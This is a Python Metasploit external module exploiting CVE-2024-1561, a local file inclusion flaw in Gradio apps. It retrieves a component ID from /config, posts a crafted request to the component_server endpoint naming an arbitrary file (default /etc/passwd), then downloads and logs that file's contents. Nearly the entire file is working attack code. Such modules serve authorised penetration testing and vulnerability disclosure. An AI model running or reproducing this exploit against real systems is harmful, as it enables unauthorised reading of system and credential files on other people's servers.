#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Metasploit external module
# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

import logging
import re

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'Gradio Local File Include Vulnerability',
    'description': '''
        Gradio applications are vulnerable to Local File Inclusion (LFI) via the component_server endpoint.
        This module exploits the vulnerability to read arbitrary files from the target system.
    ''',
    'authors': [
        'Dan McInerney <danhmcinerney@gmail.com>',
        'ozelis',
    ],
    'rank': 'excellent',
    'date': '2024-05-06',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/4acf584e-2fe8-490e-878d-2d9bf2698338'},
        {'type': 'cve', 'ref': 'CVE-2024-1561'}
    ],
    'type': 'single_scanner',
    'options': {
        'filepath': {'type': 'string', 'description': 'File to read', 'required': True, 'default': '/etc/passwd'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 7860},
        'ssl': {'type': 'bool', 'description': 'Use SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Converts module options to their correct types.
    '''
    corrected_args = {}
    for k, v in args.items():
        option = metadata['options'].get(k)
        if option:
            type_to_convert = option['type']
            if type_to_convert == 'bool':
                corrected_args[k] = v.lower() == 'true'
            elif type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")
    logging.debug(args)

    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
    
    try:
        with requests.Session() as s:
            # Get app config to retrieve a valid component ID
            rsp = s.get(f"{base_url}/config")
            rsp.raise_for_status()

            # Extract the first component ID from the configuration
            component_id = rsp.json()["components"][0]["id"]

            # Exploit the LFI vulnerability to get the file path
            exploit_json = {
                "component_id": component_id,
                "data": args['filepath'],
                "fn_name": "move_resource_to_block_cache",
                "session_hash": "aaaaaaaaaaa"
            }

            rsp = s.post(f"{base_url}/component_server", json=exploit_json)
            rsp.raise_for_status()

            # Extract the temporary path and read the file
            temp_path = re.findall(r'"(.*?)"', rsp.text)[0]
            read_url = f"{base_url}/file={temp_path}"

            rsp = s.get(read_url)
            rsp.raise_for_status()

            logging.info("File content:")
            logging.info(rsp.text)

    except requests.exceptions.RequestException as e:
        logging.error(f"Request error: {str(e)}")
        return

if __name__ == '__main__':
    module.run(metadata, run)